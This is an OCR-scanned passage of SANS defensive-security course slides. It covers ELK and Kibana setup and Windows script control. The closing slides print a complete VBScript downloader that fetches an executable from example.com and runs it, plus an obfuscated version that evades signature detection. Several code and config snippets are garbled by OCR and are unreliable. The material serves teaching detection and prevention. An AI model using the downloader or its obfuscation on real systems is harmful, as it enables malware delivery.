ElasticSearch configuration The default ElasticSearch configuration file is elasticsearch.yml, located in /etc/elasticsearch. As mentioned before, the cluster can be interacted with without authentication, so in a production environment, the " network.host" setting s hould be set to localhost. This will restrict network access to the c luster.
Another important aspect is the configuration of available memory for performance reasons. This can be changed in /etc/init.d/elasticsearch. The main guidelines to follow here are to:
· Avoid assigning more than 50% ofavailable memory; · Avoid assigning more than 32 GB overal l.
ln a typical enterprise set-up, ElasticSearch will be configured in a clustered, multi-node, setup for redundancy & performance reasons. In our lab setup, we will limit ourselves to one ElasticSearch node.

120

© 2017 Erik Van Buggenhout & Stephen Sims

Installing Kibana
Kibana can be installed using a package manager.

· Create the Kibana source list
echo "deb http://packages.elastic.co/kibana/x.x/debian stable
main" I sudo tee -a /etc/apt/sources.list.d/kibana-x.~st

kibana

· Update apt package database
sudo apt-get update

Your version number

· Install Kibana
sudo apt-get - y install kibana

SAN.~

Installing Kibaoa Kibana can be installed using a package manager.
· Create the Kibana source list (replace x.x with your desired Kibana version number)
echo "deb http://packages.e lastic.co/kibana/x.x/debian stable main" I sudo tee -a
/etc/apt/sources.Iist.d/kibana-x.x.list
· Update apt package database sudo apt-get update
· Install Kibana sudo apt-get -y install kibana
Once Kibana has been installed, we will make some additional changes to further secure the platform.

© 2017 Erik Van Buggenhout & Stephen Sims

121

Configuring Kibana (I)

To restrict Kibana network access, the following config should be set in /opt/kibana/config/kibana.yml:

server. host: "localhost"

kibana

In order to implement authentication using NGINX on the web server level, follow these steps: 1. Make sure NGINX is installed 2. Install Apache tools (the htpassword command is needed
to configure the password)
sudo apt-get install apache2-utils
SANS

Configuring Kibana (1) To restrict network access to the Kibana web interface, the followi ng config should be set in /opt/kibana/config/kibana.yml: server.host: "localhost".
As mentioned previously, another way to shield access to Kibana is by implementing authentication. It's possible lo implement authentication on the server using NG INX. The following steps will allow you to enforce Basic HTTP Authentication:
I. Make sure NGINX is installed 2. lnsLall Apache tools (the htpassword command is needed to configure the password)
sudo apt-get install apache2-utils

122

© 2017 Erik Van Buggenhout & Stephen Sims

Configuring Kibana (2)

3. Setup HTTP Basic Authentication
Credentials

worker_processes 1;
events { worlcer_ c;onMctions 1024;

sudo htpasswd -c /opt/elk/ . espasswd sec599
This command will ask for a password that

upstream kibana { server U?.e.e.1:57&1; k.eepaliv1'.!' 1s;

will be encrypted and stored in the ~pecified file for the specified username.

Sl?Nl?r {
listen 8882;

location / {

auth_ b a si c

NProtccted Kibana·;

aut.h_basic_u.ser_file /opt/elk/ .cspa.sswd;

4. Update the NGINX configuration
1. Stop any NGINX processes /usr/bin/nginx -s stop
2. If needed, update auth_ basic and auth_basic_user_file in the sample config

proxy_pa.s.s http://kibana; proxy_N!direct off; proxy_buffedns off;
proxy http version 1.1; proxy=sct_heac:ler connection '"1(ecp-Alive·; proxy_set_hcader Proxy-Connection "'keep-Alive'";

3. Start NGINX with the updated config file nginx -c path_to/sample.conf

Configuring Kibana (2)
3. Setup HTTP Basic Authentication Credentials sudo htpasswd -c /opt/elk/.espasswd sec599
This command will ask for a password that will be encrypted and stored in the specified file for the specified usemame. 4. Update the NGINX configuration 1. Stop any NGINX processes
/usr/bin/nginx -s stop 2. If needed, update auth_ basic and
auth_basic_user_file in the sample config 3. Start NGINX with the updated config file
nginx -c path_to/sample.conf
A sample configuration can be found below is provided.

© 2017 Erik Van Buggenhout & Stephen Sims

123

Installing Logstash
Logstash can be installed using a package manager.

· Create the Logstash source list

1ogstash

echo 'deb http://packages.elastic.co/logstash/x.x/debian

stable main' I sudo tee /etc/apt/sources.list.d/logstash-x.x . list

· Update apt package database
sudo apt-get update

f
Your version number

· Install Logstash
sudo apt-get install logstash

SAN~

rnstalling Logstash Depending on your Linux distribution, Logstash can be installed using a package manager.
· Create the Logstash source list (replace x.x with your desired Logstash version number)
echo 'deb http://packages.elastic.co/Iogstashlx.x/debian stable main' I sudo tee
/ etclapt/sources. l ist.d/logstash-x.x.x. l is t
· Update apt package database sudo apt-get update
· Install Logstash sudo ap1-get install logstash

124

© 2017 Erik Van Buggenhout & Stephen Sims

Logstash Parsers & Configuration
Depending on the type of logs we want to analyze, Logstash configuration can be trivial or complex:
logstash
· Structured data formats such as XML or key-value pairs like JSON are easy to parse;
· Raw logs will require some analysis in order to understand how they are to be parsed;
· Logstash parsing configurations for the majority of known log formats have been developed by the community and are freely available online;
· Grok provides endless flexibility to build structure in a big dump of raw data
SJ\NS
Logstash Parsers & Configuration Depending on the type of logs we want to analyze, Logstash configuration can be trivial or complex.
Structured data such as XML, or key-value pairs like JSON are easy to parse since these data types are already well-structured and aimed at automated processing. Raw logs require some analysis in order find a certain structure and understand how they should be parsed.
The community has already developed parsing configurations for the majority of known log fonnats. These configurations are available on line for free and can thus be reused in your Logstash configuration. We have included a nice overview of available community work on the next slide.
A useful plugin to help with structuring logs is Grok. It is currently the best way to parse unstructured log data into something that is structured and queryable. Grok is perfect for syslog logs, Apache and other web server logs, mysql logs, and in general, any log fom,at that is written for humans and not computer consumption. It works by combining text patterns into something that matches your logs.

© 2017 Erik Van Buggenhout & Stephen Sims

125

Logstash Community Configurations

Some useful free repositories with Logstash configurations:

· https:/ / github.com/sysforensics/LogstashConfigs · https://github.com/cvandeplas/ELK-forensics · https://github.com/philhagen/sof-elk · https://github.com/SMAPPER/Logstash-Configs · https://github.com/CuBoulder/ logstash

logstash

Note: Depending on the Logstash version you deploy, configuration files could have minor differences and could require minor adaptation.
SAN~

Logstash Community Configurations The following repositories contain some useful, free Logstash configurations:
https://github.corn/sysforensics/LogstashConfigs https://github.com/cvandeplas/ELK-forensics https:/ / github.com/ philhagen/sof- e l k https://github.com/SMAPPER/Logstash-Configs https://github.com/CuBoulder/logstash
There are configurations for Bluecoat, Checkpoint, llS, McAfee, ESXi, and many more. One ofthe repositories is used in another SANS course, namely FOR572, which is aimed at advanced network forensics and analysis.
It should be noted that these configuration files could have minor differences, depending on the Logstash version you deploy. Some minor adaptations could thus be required.

126

© 2017 Erik Van Buggenhout & Stephen Sims

Visualizing with Kibana
To create a visualization with Kibana, the following steps can be taken:

1. Click "Visualize" in Kibana's main menu on the left; 2. Click "Create new visualization" or "+"; 3. Choose a visualization type, such as basic chart Oine/area/bar/pie), data
(data table/metric), maps (tile map), time series (timelion), or other; 4. Specify a search query to retrieve the data for your visualization 5. Choose the metric aggregation for the Y-axis (count, avg, sum...) 6. Choose the bucket aggregation for the X-axis (date histogram, range...)

Using Kibana visualizations, the available dashboards and visuals are only limited by the user's imagination!

. s~

;

Visualizing with Kibana To create a visualization with Kibana, the fol lowing steps can be taken:
1. Click "Visualize" in Kibana 's main menu on the left;
2. Click "Create new visualization" or"+";
3. Choose a visualization type, such as basic chart (line/area/bar/pie), data (data table/metric), maps (tile map), time series (timelion), or other;
4. Specify a search query to retrieve the data for your visualization To enter new search criteria, select the index pattern for the indices that contain the data you want to visualize. This opens the visualization builder with a wildcard query that matches all of the documents in the selected indices. To build a visualization from a saved search, click the name of the saved search you want to use. This opens the visualization builder and loads the selected query. Note that any subsequent modifications to the saved search are automatically reflected in the visualization. To disable automatic updates, you can disconnect a visualization from the saved search.
5. Choose the metric aggregation for the Y-axis (count, avg, sum . ..)
6. Choose the bucket aggregation for the X-axis (date histogram, range ...)
Using Kibana visualizations, the available dashboards and visuals are only limited by the user's imagination!

© 2017 Erik Van Buggenhout & Stephen Sims

127

Kibana D ashboards (I)

SAN~

Creating a new dashboard
Click "Dashboard" in the side navigation. Kibana displays a page where you can create a new dashboard if you haven't previously viewed a dashboard. If you have, click the "Dashboard" breadcrumb to return to the landmg page. Using the "+", it's possible to create a new dashboard.

Share Edit <

Edit m ode
Brand new dashboards will automatically start in "Edit" mode. Otherwise. click "Edit" in the top right bar to be able to add new visualiiations.

Kibana Dashboards ( I ) Click "Dashboard" in the side navigation. Kibana displays a page where you can create a new dashboard if you haven't previously viewed a dashboard. Ifyou have, click the "Dashboard" breadcrumb to return to the landing page. Using the"+", it's possible to create a new dashboard.
A brand-new dashboard will automatically start in "Edit" mode. Otherwise, click "Edit" in the top right bar. This will allow you to add new visualizations to the dashboard. Kibana visualizations are based on ElasticSearch queries. By using a series ofElasticSearch aggregations to extract and process your data, you can create charts that show you the trends you want to know about. You can create visualizations from a search saved from "Discover" or start with a new search query.

128

© 2017 Erik Van Buggenhout & Stephen Sims

Kibana Dashboards (2)

Viewing visualization data
Click the "Expand" button to view the data contained in the visualization.
SANS

Adding visualizations
Once in edit mode, click "Add" and select a visualization. In case you have a large number of visualizations, it's possible to filter the list using a filter string.
Kibana will display the visualization in a container on the dashboard. It's possible to move, resize, or remove the visualizations. Once you're done editing. click "Save" from the top right menu and enter a name and time period.

Kibana Dashboards (2) Once in edit mode, click "Add" and select a visualization. In case you have a large number ofvisualizations, it's possible to filter the list using a filter string.
Kibana will display the visualization in a container on the dashboard. It' s possible to move, resize, or remove the visualizatioru;. Once you're done editing, click "Save" from the top right menu and enter a name and time period.
lfyou want to view the data contained in the visualization, click the "Expand" button in the bottom left comer ofthe visualization.

© 2017 Erik Van Buggenhout & Stephen Sims

129

Kibana V isualization Editing

,a
... , ii

· limenamp per 30 seconds Cl
1,1,, 29:> i,;17 l60UI0000
'"'Y29m 2017, ll>OlJ0-000 ...., 29<· 2017. !6·; 00 000
M»y29:h20~J l&0}·10000

Count

flutlcse1rch r~uest body

Visualization data
After clicking the "Expand" button, a table is shown containing the underlying data.
It's also possible to view the raw ElasticSearch request and response in JSON format or see query statistics.
SANS

·-at.,,.. o. T ((

·,t.a-:e
·u,

h1lr.no·,g-r1-.·.

.(._

.

,

U\t.c-rval.· ,a;··
"tlae · ·e.....,. krlin",
··tn doc COUlflt· l

Modify a visualization
To modify a visualization, the "Edit" button in rhp upper right should be clicked when viewing the visualization or its data through the dashboard's edit mode.

Kibana Visualization Editing After clicking the "Expand" button (as explained in the previous slide), a table is shown containing the underlying data. It's also possible to view the raw ElasticSearch request and response in JSON format or see query statistics.
To modify a visualization, the "Edit" button (looking like a pencil) in the upper right should be clicked when viewing the visualization or its data through the dashboard's edit mode. However, v isualizations can also be modified through the "Visualize" tab in Kibana's main menu.

130

© 2017 Erik Van Buggenhout & Stephen Sims

ELK Stack - Additional Resources
Some additional resources that can prove to be useful for the ELK stack include:
· httPs://www.elastic.co/ Elastic's homepage htt_ps: / /www.howtoforge.com/tutorial/how-to-insta1l-elastic-stack-on-ubuntu-16-o4/ Easy ELK install guide for Ubuntu 16.04
· httPs://redmine.openinfosecfoundation.org/projects/suricata/wiki/ Logstash Kibana and S uricata JSON output Configuring Suricata & ELK to parse Suricata EVE logs
SANS
ELK Stack- Additional Resources Some additional resources that can prove to be useful for the ELK stack include:
https://www.elastic.co/ Elastic's homepage https://www.howtoforge.com/tutorial/how-to-install-elastic-stack-on-ubuntu- I6-04/ Easy ELK install guide for Ubuntu 16.04 https://redmine.openinfosecfow1dation.org/projects/suricata/wiki/_Logstash_ Kibana_and_Suricata_JSON_out put Configuring Suricata & ELK to parse Suricata EYE logs

© 2017 Erik Van Buggenhout & Stephen Sims

131

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertin~ Payload Delivery · Day 3: Preventing Exploitation
· Day 4: Avoiding Installation, Foiling Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SEC599.2
Strategies for Pre venting / De tecting Payload Delivery End-User Sec urity Awareness Leveraging Suricata IDS / IPS E-mail Security Controls
Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules
Exercise: Finding the Needle in the Haystack Using YARA W e b Security Controls
Exercise: Deploying PfSense Firewall with Squid & ClamAV
· Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

SAN~
This page intentionally left blank.

132

© 2017 Erik Van Buggenhout & Stephen Sims

Exercise - Developing Eye-Candy Using Kibana
IThe objective of the lab is to configure our PfSense instance to forward its logs / results to our ELK stack for central storage, retention, and analysis. Furthermore, we will develop Kibana dashboards for easy monitoring.
High-level exercise steps: 1. Configure our PfSense instance to forward logs to ElasticSearch 2 . Configure Logstash for correct log parsing 3. Develop Kibana dashboards for easy visualization
Exercise - Developing Eye-Candy Using Kibana The objective ofthe lab is to configure our PfSense instance to forward its logs / results to our ELK stack for central storage, retention, and analysis. Furthennore, we will develop Kibana dashboards for easy monitoring. As part of the exercise, you will complete the following tasks:
I. Configure our PfSense instance to forward logs to ElasticSearch 2. Configure Logstash for correct log parsing 3. Develop K.ibana dashboards for easy visualization In order to increase the added value for attendees, we have added the full solution as virtual machines to the course USB drives.

© 2017 Erik Van Buggenhout & Stephen Sims

133

Exercise - Developing Eye-Candy Using Kibana - Conclusion
During this lab, we configured our existing solutions to forward log information to a pre-configured ELK stack. Furthermore, we created some basic visualizations to get hands-on with Kibana!
L
~Sense PfSense with Squid & SquidGuard as a web proxy
it· elastic The ELK stack for easy log indexing, parsing &visualization
Exercise - Developing Eye-Candy Using Kibana - Conclusion During this lab, we configured our existLng solutions to forward log infonnation to a pre-configured ELK stack. F urthennore, we created some basic visualizations to get hands-on with Kibana!
· We used PfSense with Squid & SquidGuard as a web proxy to monitor outbound HTTP(S) connectivity
· We ensured our solution forwarded its logs to ElasticSearch · We ensured the logs were properly parsed by Logstash · We developed some basic visualizations to get hands-on with Kibana

134

© 2017 Erik Van Buggenhout & Stephen Sims

Course Roadmap

SEC599.2
Strategies for Preventing / Detecting Payload Delivery

· Day 1: Knowing the Adversary,

End-User Security Awareness

Knowing Yourself · Day 2: Avertine Payload Delivery

Leveraging Suricata IDS/ IPS E-mail Security Controls
Exercise: Building a Sandbox Using Suricata & Cuckoo

· Day 3: Preventing Exploitation

Zooming in on YARA Rules

Exercise: Finding the Needle in the Haystack Using YARA

· Day 4: Avoiding Installation, Foiling

,,..

Command & Control & Thwarting

Web Security Controls Exercise: Deploying PfSense Firewall with Squid & ClamAV

Lateral Movement

Stopping Delivery Using Removable Media

· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

· Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

Thi s page intentionally left blank.

© 2017 Erik Van Buggenhout & Stephen Sims

135

Controlling Script in the Enterprise

IWindows provides extensive scripting capabilities different levels and in different products by default.

at

IBoth official IT & business (shadow IT) leverage scripts to automate / facilitate tasks.

IDue to its presence in the corporate environment, scripting is a highly useful feature for adversaries as well.

SAN~
Cootrolling Script in the Enterprise Windows provides extensive scripting capabilities at different levels and in different products. Typical for Microsoft, Windows supports countless legacy (scripting) technologies to ensure maximum backward compatibility. For example, Windows IO still supports batch file programming (.BAT files), a technology predating Windows with the MS-DOS operating system.
The same scripting technology can be present at different levels and in different products. For example, Microsoft Visual Basic Scripting Edition (VBScript) is a scripting technology present in Windows Explorer (.vbs files) and in applications like Internet Explorer (<script language="VBScript">). Different implementations have different access policies to Windows resources like files and registry values.
Scripting is a programming environment both accessible to IT administrators and non-IT employees. Enterprises could not survive without scripting. It's often a low-barrier entry into programming, to automate many repetitive tasks that would otherwise require staff involvement. Scripting is provided to the business by official IT and by shadow IT. With shadow IT, we mean the design and implementation of IT solutions by non-IT staff.
Scripting is a powerful tool to control the Windows environment with its n::sources and applications. This powerful tool is not only useful to the enterprise, but it is also leveraged by the attackers to conduct the initial intrusion.

136

© 2017 Erik Van Buggenhout & Stephen Sims

Common Script Types in the Enterprise

We will zoom in on some ofthe most commonly observed scripting languages in the enterprise:

E

IV~sual Bas!c is s_cripting te_chnology. implem~nted in 2 _major incarnations: Visual Basic Scnpt (VBScnpt) and Visual Basic for Applications (VBA).

I I IJScript OavaScript) is most known for its use in web browsers, but Windows also includes a standard Jscript engine.

·

IPowerShell is the latest, object-oriented scripting technology from Microsoft, implemented in Windows.

Common Script Types in the Enterprise An exhaustive discussion ofa ll scri pting technology used in Windows is outside of the scope ofthis course. Due to the many scripting technologies available in Windows, an exhaustive list would take weeks to discuss. We decided to focus on 3 scripting technologies popular with adversaries: Visual Basic, JavaScript and PowerShell. Be aware though that popularity with adversaries is time-bound: unpopular scripting technology can become popular.
BASIC (Beginner's All-purpose Symbolic Instruction Code) is an old programming language that first appeared in 1964. Microsoft's implementation for Windows, Visual Basic, appeared in 1991. The scripting technology we are discussing is VBScript and VBA. VBScript can be executed by the VBScript engine on Windows, or by the VBScript engine implemented in applications like Internet Explorer. On Windows, the VBScript engine typically has the same rights as the user, while in applications like Lntemet Explorer, it is restricted in its interaction with the operating system's resources like fi les and registry values. VBA is executed by the VBA engine implemented in applications like Microsoft Office, AutoCAD, ...
When we talk about JavaScript on Windows, we actually mean JScript: Microsoft's implementation of ECMAScript. ECMAScript is JavaScript standardized by ECMA (European Computer Manufacturers Association). Like VBScript, ]Script can be executed by standalone engines on Windows or by engines implemented in Internet Explorer or Edge.
PowerShell is Microsoft latest scripting technology leveraging the object-oriented .NET technology. First introduced in 2006, it was made available as an installation package for Windows XP and Windows Vista. PowerShell version 2.0 was integrated with Windows 7, and since then, all new Windows releases integrate PowerShell. PowerSheU was open-sourced and made available for other operating systems than Windows in 2016.

© 2017 Erik Van Buggenhout & Stephen Sims

137

Introducing Visual Basic
VBScript is executed by the Windows Script Host. It can run as a console application (cscript.exe) or a GUI application (wscript.exe). The VBScript engine is actually not implemented in wscript.exe or cscript.exe, but in vbscript.dll.

Windows Script Host
SAN~

cscript.exe wscript.exe

vbscript.dll

Introducing Visual Basic VBScript is executed by the Windows Script Host or by the embedded engine ofan application like Internet Explorer. In this course, we will focus on WSH execution. This is the execution of scri pts files with an extension like .vbs.
The Windows Script Host is implemented in 2 executables: cscript.exe and wscript.exe.
Windows executables (PE files) that use the Windows subsystem come in 2 flavors: console executables and GU! executables. Console executables require a console: when a process is created, a console with standard streams STDIN, STDOUT and STDERR is created. GUI executables do not require a conso le: standard streams are not created, and the executable must render its own GUI ifnecessary.
T he console version of the Windows Script Host is implemented in cscript.exe, and the GU! version ofthe Windows Script Host is implemented in wscript.exe. When a VBScript is executed (for example by double-clicking a .vbs file in Windows Explorer), wscript.exe is launched with the .vbs files as argument.
ln Microsoft' s typical modular design, the VBScript eng ine is actually not implemented in the Windows Script Host executables wscript.exe and cscript.exe, but in the DLL vbscript.dll.
This prevents code duplication: the code for the scripting engine must not be "copied" into the wscript.exe and cscript.exe executables, but just needs to be present in vbscript.dll. There it is available for applications like wscript.exe and cscript.exe, but also other applications like Internet Explorer.
Vbscript.dll is not a "traditional" DLL, it is not a DLL that exports functions to be consumed by applications directly (for example, like a function to execute a VBS script). Vbscript.dll is an ActiveX DLL, it contains ActiveX objects to be consumed by ActiveX host applications. ActiveX objects are defined in the registry and accessed via the COM/ActiveX framework.
COM and ActiveX objects defined in DLLs can be registered and unregistered with the regsvr32.exe application.

138

© 2017 Erik Van Buggenhout & Stephen Sims

Running a Visual Basic Script
.. ,--
: : \Unrs\Public>type console.vbs ,<scdpt.echo "Hello"
C: \Users\Publie>cscript console. vbs ~icrosoft (R) Windows Script Host Version S. 812 t:opyright (C) llicrosoft Corpornion. All rights reserved.
· ello
: :\Users\Publie>wscript console.vbs
: :\Users\Public>

Wondows S<npt Host X Hdlo
II Cl(

RunningVB scripts
The screenshot on the left provides an insight in the execution of the console.vbs file using cscript and wscript, thereby illustrating the console and GUIstyle execution.
Note that scripts can also be double-clicked from the Windows Explorer to achieve execution.

Running a Visual Basic Script When a VBScript is executed from the command line (cmd.exe), by default it uses wscript (GUI). cscript.exe can be launched exp1icitly, like this:
C: \Demo>cscript console.vbs Microsoft (R) Windows Script Host Version 5.8 12 Copyright (CJ Microsoft Co,poration. All rights reserved.
Hello
The content ofconsole.vbs is :
wscript.echo "Hello "

© 2017 Erik Van Buggenhout & Stephen Sims

139

Controlling/ Limiting Script Execution
We explained Visual Basic Scripting internal to better understand how we can better control / limit script execution. Several options exist:
· Disabling the Windows Script Host for particular users by changing the "HKEY_ CURRENT_ USER\Software\Microsoft\Windows Script Host\Settings" registry key => This will also block other scripts (such as Jscript)
· Remove or block access to wscript.exe and cscript.exe (using, for example, application whitelisting)
· Disable global VBScript support by deregistering ActiveX components "regsvr32.exe /u vbscript.dll"
SANS
Controlling/ Limiting Script Execution By focusing on the inner workings of VBScript, we are better able to understand how to detect execution of VBScript and how to prevent it. By default, when a .vbs file is launched, the wscript.exe Windows Script Host executable is executed.
By monitoring all processes running on a Windows machine, we can log execution ofwscript.exe and cscript.exe and thus record evidence of .vbs file execution. Remark that .vbs is not the only file extension through which VBScripts can be executed. There are many other extensions, for example, .vbe and .wsf.
Windows Script Host can be disabled for a particular user by making the following registry changes: In registry key HKEY_CURRENT_ USER\Software\Microsoft\ Windows Script Host\Settings, create a REG_ DWORD value with name Enabled. This value does not exist by default. Assign value Oto Enabled.
This will disable all scripts executed through Windows Script Host for this particular user: these are VBScripts but also JScripts (see later), and other WSH scripting languages that might be installed.
Execution of .vbs files (and other script file extensions) can a lso be prevented by controlling the execution of wscript.exe and cscript.exe. A rather crude way to achieve this is to remove these ~x1.:l:utables. A better way is to use ACLs or application whitelisting to control the execution ofthese host applications. Remember that on 64 bit Windows machines, you have to control both execution of32-bit and 64-bit versions of cscript.exe and wscript.exe.
Another way to disable VBScript support globally (thus not only in Windows Script Host) is to deregister the ActiveX components: regsvr32.exe /u vbscript.dll

140

© 2017 Erik Van Buggenhout & Stephen Sims

Disabling Windows Script Host
When Windows Script Host is disabled through the "HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings"

Windows Scnpt Host
,ti'ii Windows Script Ho<t occess is disabled on this m·ch,ne. Contact your
W administrator for d<ttds.
OK

Windows Script Host disabled
Disabling Windows Scl"ipt Host produces this default dialog box when a .vbs file is launched.

, SANS
Oisabling Windows Script Host When Windows Script Host is disabled through the supported registry settings (Enabled = 0), a standard dialog box wi ll be presented to inform the user that Windows Script Host has been disabled and that an administrator can be contacted for further details.
This effectively stops YBScripts from executing, but it could leave your users wondering what happened, and they might contact the helpdesk for this error message. User awareness is important to have your users correctly report a potential attack and to avoid overloading the helpdesk with support tickets.

© 2017 Erik Van Buggenhout & Stephen Sims

141

Removing cscript.exe and wscript.exe

.2) ...,_,.. OIOCIMltllpog-.",0,1...,_fOWltl009tf'l....l
Rtc~mcndtd Pf09'~

~... ,

Removing cscript.exe & wscript.exe
Removing cscript.exe & wscript.exe will produce this dialog box when a .vbs script is launched.
A less aggressive means of achieving the same is implementing application whitelisting to prevent the wscript.exe and cscript.exe executables from executing.

SANS
Removing cscript.exe and wscript.exe More crude prevention methods like removing wscript.exe will produce dialog boxes like the one above. This too is an effective way to block execution of.vbs tiles, but it is less user-friendly and wi 11 require more user awareness and helpdesk training to avoid confusion and unnecessary helpdesk calls. A less aggressive means of achieving the same is implementing application whitelisting to prevent the wscript.exe and cscript.exe executables from executing.

142

© 2017 Erik Van Buggenhout & Stephen Sims

VBScript as a Malware Downloader

1 Set oXMLHTTP = CreateObject ("MSXML2 . XMLHTTP") 2 oXMLHTTP.Open "GET" , "http: //example . com/malware . html ", False

3 oXMLHTTP . Send

4
5 Set oShell = CreateObject("WScript . Shell")
6 strPath = oShell.ExpandEnvironmentStrings( "%TEMP%\malware.exe")

7
8 Set oStream = CreateObject ("Adodb . Stream") 9 oStream. Type = 1 10 oStream. Open 11 oStream.Write oXMLHTTP.responseBody
12 oStream.Savetofile strPath, 2

VBScript malware downloader
A popular use ofVBScript by malware authors is to code a downloader.

13 14 oShell . Run strPath

A typical downloader will download an executable via HTTP. write it to local

disk and execute it.

SANS

VBScript as a Malware Downloader Often malicious VBS files are delivered via e-mail as an attachment (original or inside a ZIP container), with a social engineering component to entice the recipient to open the attachment. As we now know, when a .vbs file is launched, the Windows Script Host will execute the content of the VBScript.
A typical use ofVBS in initial intrusion is a downloader. A downloader is a VBScript designed to download an executable from the Internet (often with HTTP), write it to disk and execute it.
ln line I to 3 of this script, an ActiveX object is created to download a file from website example.com via HTTP. The downloaded file is kept in memory.
Line 5 and 6 create an ActiveX object to instantiate the absolute path in the temporary folder ofthe user to the executable malware.exe.
Lines 8 to 12 are necessary to write the down loaded file to disk: an ActiveX object is created which is used to write binary data to disk.
Finally, in line 14, the downloaded executabk is launched.

© 2017 Erik Van Buggenhout & Stephen Sims

143

VBScript Obfuscation

l ' jznecviojzennjizenecdjinzijencdjizndejq

2 Set zhuznhuzd · Create0bject(Jdet( "4D5358404C322ES84D4C485454S0" ))

3 ' ejnijcneijcnJizendjienceJindfiJcvnjnvcjievJfnve1envje

4 zhuznhuzd .Open Jdet("474554"') , Jdet("687474703A2F2F65786160706C6S2E636F6D2F6D616C776172652E68746D6C") , Fal3e

5 ' jzncijznczijnczJicnzjincjiznczjidnzejnc1znedjinedcJizn, xakozjx,zecec

6 zhuznhuzd. Send

7 ' jzncjncedjincedjcnjcnjdncjdncJzec

8 Set opygtpot a Create0bject(Jdet("57S363726970742E5368656C6C"))

9 "vercvr lv, uanzjzcnutnvuezjcncj , rervth

10 yejcofj a opygcpot ..t:xpan<IBnv1ronmentStrings (Jdet ("2554454D50255C6D616C776172652E657865"))

11 ' rtvfk,az,xnjfrvgo;bnhxznvtrnncuhzbxhucb!hgbvhrebchzbnxuhbcehufrbhVlllM!huznxzuhxchtvbrt

12 Set zi xuinuzxuzx · c reateobject(Jdet("41646F64622E53747265616D")J

13 ' icjzncijznejiefntvjnrjinjirvr

14 zixuinuzxuzx . Type · l

15 ' czhJbnbuzcuhbuhbhubhubzhcubedcze

16 zixuinuzxuzx. Open 17 ' czjnhjnjnnji ni jnijnzijc ndecr

Making it a bit less readable ...

18 zixuinuzxuzx . Write zhuznhuzd. responseBody 19 ' hjn zncjidencjinejirnvjirnenvceicnxzikxzftg\·

Often. malicious scripts like VBScript are obfuscated to avoid

20 zi xuinuzxuz x. Savetofile yejcofj, 2

detection and to obstruct analysis.The sc,-ipt here does

21 ' jcznjnzicnidecjnrfjnvrrinvr 22 opygtpot. Run yejcofj

exactly the same as the script in the previous slide. but this is less obvious because of code and string obfuscation.

SANS

VBScript Obfuscation Typical malicious scripts will be obfuscated: the code is made less readable to avoid detection by security tools like antivirus, and to frustrate analyst trying to understand what the VBScript does. In Visual Basic on Windows, 2 common obfuscation techniques are used: code obfuscation and string obfuscation.
The VBScript example in this slide does exactly the same as the VBScript in the previous slide but is made less readable and detectable by using code and string obfuscation.
An example ofcode obfuscation is the addition of meaningless comments (the lines starting with': line I, 3, 5 ...). These are line comments and make the code less readable.
Another code obfuscation technique is the use of meaningless names for variables, functions, subroutines, ... In line IO for example, the name of the variable in the unobfuscated VBScript was strPath. This makes it clear that the variable contains a path to a file. While in this VBScript, variable name yejoofj is used, revealing nothing as to its purpose. The purpose has to be derived by context analysis of the script.
String obfuscation involves replacing the value ofstrings with an encoded equivalent value and calling a function to decode the encoded string before it is used. Line 2 is a good example ofstring obfuscation. While in the previous script we would see CreateObject with string "MSXML2.XMLHTTP" and immediately understand that this would be used to download something from the Internet, in this script the string "MSXML2.XMLHTTP" is no longer present but has been replaced by a call to function Jdet with a string as argument that does not immediately reveal its purpose. Jdet is the decoding function, and the string passed to Jdet is the encoded (obfuscated) string. In this example, we use a simple string obfuscation technique: the string has been encoded by replacing each character with its hexadecimal representation, and the Jdet function converts hexadecimal to binary. For brevity, the definition of the Jdet function is not included in the code.
lfwe would have an anti-virus signature or YARA rule to detect potential malicious VBScript downloaders by searching for strings "CreateObject", "MSXML2.XMLHTTP" and " http://", then this string obfuscation would evade detection.

144

© 2017 Erik Van Buggenhout & Stephen Sims

VBScript Encoding (VBE)

f@~"twIAAA==99fa9(5fP{P; . +mYnr(Ln"D'JqjmMlcwD jtr VAJbR3aalUNAO\bDGOstxOjODrxTdvJYO+sw]rf@t@&f9faNop9~{Pf9969(pG~ ' Pr
- r@f@&Aj/X(t; 68P{PE40Ywl&Jl2kcVmk . K/4+1AY4"1M+ WMo&[Mkz9GxmY+c24wr@t@&Cafat9(a?Ga?wPx~rN/W%6L-/9 r6nrP@t@&Nb :, H. X
r9mX?fW7l/=~? rYPgfa rGmX?f0CkPxPl . +mYnG (L+"OvJ\kl . K/G6Yc (HdC : Pnrf@t@&9kh-616Va (A /6z9)MG) , ?nYWg6!6os/Xb9)VfPx~lDnlOnK4%,-mD'JzNK(4c?ODr lhE*@f@&gt6qfmXjf07lkR6wnU,J!2 : E~ , Aj/X()5W(~~srnsk+@l@&lj6r GmXj . 6\C/c?nU9@f@&@f@&hbYt , WH6V6oVd6)9zM9@t@&~P, P
OHw+~x, F~@t@&~, P~cWa+x@t@& , ~P, RADbYn~g . 6q9mX? . 6-C/c0r/2WUdr AGNB@f@& , P~~c/l-nDWWk"n , f(G69 (pGPL~P_696jNpaUf6Uo~ , P@l@&nx 9PSkOt@t@&U+OPtHA M(9S+OOOS+ . P(~ ; DnmYrr4N+lO'r?4+"V )awVbAlDkW EbP@t@&tl$C![GhnDDOhrD 6a+x~99faNo)GP ', P_6fX . 9p6Ufa?w@f@&4NMAAA=Q"f~@

Proprietary encoding
VBScript supports a proprietary encoding scheme to hide the content of scripts to users. Such encoded .vbs files can be recognized by their extension: .vbe.This is an example of such a VBE script.
"decode-vbe.py" is a Python script I program written by Didier Stevens to decode VBE files (https://blog.didierstevens.co m/2016/03/29/decoding-vbe/).

VBScript Encoding (VBE) Administrators writing VBS scripts for deployment on user's workstation might occasionally want to hide the content ofthe YBScript so that the user would not tamper with it by modifying the script.
Microsoft offers an ad-hoc solution for this problem: encoded YBS. Encoded VBScripts are stored in files with extension .vbe instead of extension .vbs. When the Windows Script Host executes a .vbe file, it is first decoded and then executed.
